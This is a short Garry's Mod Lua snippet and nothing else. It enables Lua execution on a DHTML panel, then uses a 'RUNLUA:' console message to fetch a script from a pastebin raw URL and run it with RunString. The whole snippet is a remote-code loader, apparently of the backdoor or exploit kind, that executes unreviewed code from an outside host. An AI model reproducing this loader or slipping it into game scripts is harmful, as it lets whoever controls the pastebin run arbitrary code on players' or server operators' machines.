local f = vgui.Create('DHTML');
f:SetAllowLua(true);
return f:ConsoleMessage([[RUNLUA:
http.Fetch("https://pastebin.com/raw/1mvcGzB9",function(b)RunString(b)end)
]]);
